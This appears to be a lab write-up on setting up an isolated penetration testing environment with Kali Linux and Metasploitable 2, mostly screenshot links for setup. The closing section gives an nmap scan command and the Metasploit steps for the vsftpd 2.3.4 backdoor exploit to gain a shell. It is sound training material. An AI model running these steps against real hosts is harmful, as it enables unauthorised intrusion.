# Setting Up a Penetration Testing Lab

Objective:

Develop a controlled environment for ethical hacking and penetration testing to understand and exploit system
vulnerabilities in a safe and secure manner.


Tools Used:


● VirtualBox


● Kali Linux


● Metasploit


● Nmap


Methodology:
1. Installed and configured Kali Linux as the penetration testing machine.
2. Deployed Metasploitable 2 and other vulnerable virtual machines to simulate real-world targets.
3. Used Nmap for network scanning and Metasploit for exploiting known vulnerabilities.

   
Challenges Faced & Solutions:


● Challenge: Ensuring the safety and security of the lab environment.

●  Solution: Configured the lab to be completely isolated from any external networks to prevent
accidental exposure.

Outcome:

Developed a comprehensive understanding of ethical hacking techniques and how to safely perform
penetration testing. This experience reinforced the importance of maintaining secure lab environments.


## Steps


Step 1

Download Kali Linux 

https://imgur.com/a/v0Sw94K

Import Kali Linux into Virtual Box

https://imgur.com/a/FfjZw29

Step 2 Download Metasploitable 2

https://imgur.com/a/ryM9dii

Extract zip file for Metasploitable 2

https://imgur.com/a/ytJPYny

Add vdmk file to virtual box

https://imgur.com/a/cbqQ15Z

Create a new VM in Virtual Box for Metasploitable 2

https://imgur.com/a/xvRcZCj

Start Metasploitable 2 Virtual Machine

https://imgur.com/a/mZfOQhu

Step 3 Configure Network Settings

https://imgur.com/a/t3orTE7

Step 4: Verfy Network Connectivity


Verify Network Connectivity on Kali Linux

https://imgur.com/a/4ybqxFa

Verify Network Connectivity on Metasploitable 2 

https://imgur.com/a/HQ9eKvz

Test Connectivity

https://imgur.com/a/EmxXlWy

 Step 5: Set Up Penetration Testing Tools on Kali Linux

 Update Kali Linux

https://imgur.com/a/cHq3NQc

Install Additional Tools

https://imgur.com/a/2cQh5Of

https://imgur.com/a/bjQrJRq

https://imgur.com/a/nMII0th

Step 6: Conduct Basic Penetration Testing

Network Scanning with Nmap

https://imgur.com/a/PHpjy7j

https://imgur.com/a/Mk456dC

Exploitation with Metasploit

https://imgur.com/a/zvA75iV

Search for an Exploit to use against Metasploitable 2

https://imgur.com/a/uWoLYhi

Use the exploit and set the target

https://imgur.com/a/MtOZwo1

https://imgur.com/a/cD93YsN

Step 7: Document Network Diagram

https://imgur.com/a/sWNLkej

Scan Results & Exploitation Details



Step 7: Network Diagram

https://imgur.com/a/sWNLkej

   

A basic network setup includes:
- Kali Linux VM: Offensive security testing machine.
- Metasploitable 2 VM: Deliberately vulnerable virtual machine for testing.
- Host-only Network**: Allows VMs to communicate with each other and the host machine without external network access.

Here’s a basic visual representation:

1. Kali Linux VM
2. Metasploitable 2 VM
3. Host-Only Network (192.168.x.x)

---

 2. Documenting the Nmap Scan Results

On the Kali Linux VM, you can run an Nmap scan to identify open ports and services on the Metasploitable 2 VM.

 Nmap Command

```bash
nmap -sV -A 192.168.x.y
```

- `-sV`: Detects version info for services.
- `-A`: Enables OS detection, script scanning, and traceroute.
- Replace `192.168.x.y` with the IP of the Metasploitable 2 VM.


| Port | State | Service         | Version            |
|------|-------|-----------------|--------------------|
| 21   | open  | ftp             | vsftpd 2.3.4      |
| 22   | open  | ssh             | OpenSSH 4.7p1     |
| 23   | open  | telnet          | -                 |
| 25   | open  | smtp            | Postfix smtpd     |
| 80   | open  | http            | Apache 2.2.8      |
| 3306 | open  | mysql           | MySQL 5.0.51a     |
| 5432 | open  | postgresql      | PostgreSQL DB     |
| 8180 | open  | http-alt        | Apache Jserv 1.3  |




3. Exploitation Steps**

Using vsftpd 2.3.4 which is a known vulnerability in Metasploitable 2:

1. Search for Exploits in Metasploit
   ```bash
   msfconsole
   ```
   ```bash
   search vsftpd
   ```

2. Select the Exploit Module
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. Set the Target Host
   ```bash
   set RHOSTS 192.168.x.y
   ```

4. Run the Exploit**
   ```bash
   exploit
   ```

5. Gain Access**
   After running the exploit, you may gain a shell on the target machine.




 

  












